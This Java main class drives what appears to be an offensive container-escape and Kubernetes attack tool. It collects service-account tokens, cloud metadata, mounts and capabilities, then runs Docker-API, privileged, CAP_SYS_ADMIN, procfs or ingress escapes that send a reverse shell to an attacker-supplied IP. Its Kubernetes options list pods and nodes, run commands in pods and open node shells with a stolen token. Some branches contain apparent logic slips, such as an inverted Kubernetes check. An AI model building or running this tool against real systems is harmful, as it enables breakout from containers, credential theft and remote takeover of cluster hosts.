import JOBO.CurrentHost;
import escape.APIEscape;
import information.InfoGet;
import post.KubeApiOption;
import post.KubeletApiOption;
import util.ArgumentTemplate;
import util.SerializeJOPO;

import java.io.IOException;
import java.util.Arrays;

public class Main {

    public static void main(String[] args) throws IOException, ClassNotFoundException {

        ArgumentTemplate argumentTemplate = new ArgumentTemplate();
        argumentTemplate.getArgument(args);

        if (argumentTemplate.CheckENV){
            CurrentHost currentHost = new CurrentHost();
            InfoGet.isDockerOrK8S(currentHost);
            InfoGet.getSyetemInfo(currentHost);
            if (argumentTemplate.sensitiveFile.isEmpty()){
                InfoGet.getMounts("");
            }else {
                InfoGet.getMounts(argumentTemplate.sensitiveFile);
            }
            InfoGet.getCap(currentHost);
            InfoGet.getNetInfo(currentHost);
            if (currentHost.isK8s()){
                InfoGet.getSAToken(currentHost);
            }
            InfoGet.getCloudMetadata();
            SerializeJOPO.Serialize(currentHost);
        }

        if (!argumentTemplate.escape.isEmpty()){
            CurrentHost currentHost = SerializeJOPO.UnSerialize();
            if (argumentTemplate.ShellIP.isEmpty()){
                System.out.println("shell IP is Null");
                return;
            }
            String ShellIP = argumentTemplate.ShellIP;
            switch (argumentTemplate.escape){
                case "dockerapi":
                    String DockerIP = !argumentTemplate.dockerIP.isEmpty() ? argumentTemplate.dockerIP : "";
                    String DockerSock = !argumentTemplate.dockerSock.isEmpty() ? argumentTemplate.dockerSock : "";
                    boolean b = APIEscape.DockerApiEscape(currentHost, DockerIP, DockerSock, ShellIP);
                    if (b){
                        System.out.println("Escape completed");
                    }else {
                        System.out.println("Escape failure");
                    }
                    break;
                case "privilege":
                    boolean b1 = APIEscape.PrivilegeEscape(ShellIP);
                    if (b1){
                        System.out.println("Escape completed");
                    }else {
                        System.out.println("Escape failure");
                    }
                    break;
                case "cap_sysadmin":
                    boolean b2 = APIEscape.SysAdminEscape(ShellIP);
                    if (b2){
                        System.out.println("Escape completed");
                    }else {
                        System.out.println("Escape failure");
                    }
                    break;
                case "procfs":
                    String procPath = !argumentTemplate.procPath.isEmpty() ? argumentTemplate.dockerIP : "";
                    boolean b3 = APIEscape.ProcfsEscape(ShellIP, procPath, currentHost);
                    if (b3){
                        System.out.println("Escape completed");
                    }else {
                        System.out.println("Escape failure");
                    }
                    break;
                case "ingress":
                    if (currentHost != null && currentHost.isK8s()) {
                        System.out.println("no k8s");
                        return;
                    }
                    String url = !argumentTemplate.nginxUrl.isEmpty() ? argumentTemplate.nginxUrl : "";
                    String admissionUrl = !argumentTemplate.admissionUrl.isEmpty() ? argumentTemplate.admissionUrl : "";
                    boolean b4 = APIEscape.Ingress(ShellIP,url,admissionUrl);
                    if (b4){
                        System.out.println("execute completed");
                    }else {
                        System.out.println("failure");
                    }
                    break;
                default:
                    System.out.println("Please enter the correct type");
            }
        }

        if (!argumentTemplate.OptionServerAPI.isEmpty()){
            CurrentHost currentHost;
            String Token = !argumentTemplate.token.isEmpty() ? argumentTemplate.token : "";
            String ShellIP = !argumentTemplate.ShellIP.isEmpty() ? argumentTemplate.ShellIP : "";
            try {
                currentHost = SerializeJOPO.UnSerialize();
            }catch (Exception e){
                return;
            }
            if (currentHost != null && currentHost.isK8s()) {
                System.out.println("no k8s");
                return;
            }
            switch (argumentTemplate.OptionServerAPI){
                case "getpod":
                    boolean b = KubeApiOption.getPodinfo(currentHost, Token);
                    if (b){
                        System.out.println("execute completed");
                    }else {
                        System.out.println("failure");
                    }
                    break;
                case "getnode":
                    boolean b1 = KubeApiOption.getNodeInfo(currentHost, Token);
                    if (b1){
                        System.out.println("execute completed");
                    }else {
                        System.out.println("failure");
                    }
                    break;
                case "cmd":
                    String nameSpace = !argumentTemplate.nameSpace.isEmpty() ? argumentTemplate.nameSpace : "";
                    String podName = !argumentTemplate.podName.isEmpty() ? argumentTemplate.podName : "";
                    String containerName = !argumentTemplate.containerName.isEmpty() ? argumentTemplate.containerName : "";
                    String cmd = !argumentTemplate.cmd.isEmpty() ? argumentTemplate.cmd : "";
                    boolean b2 = KubeApiOption.execCmd(currentHost, Token, nameSpace, podName, containerName, cmd);
                    if (b2){
                        System.out.println("execute completed");
                    }else {
                        System.out.println("failure");
                    }
                    break;
                case "shell":
                    String nodeName = !argumentTemplate.nodeName.isEmpty() ? argumentTemplate.nodeName : "";
                    boolean b3 = KubeApiOption.getShell(currentHost, Token, ShellIP, nodeName);
                    if (b3){
                        System.out.println("execute completed");
                    }else {
                        System.out.println("failure");
                    }
                    break;
                default:
                    System.out.println("Please enter the correct type");


            }
        }


    }

}
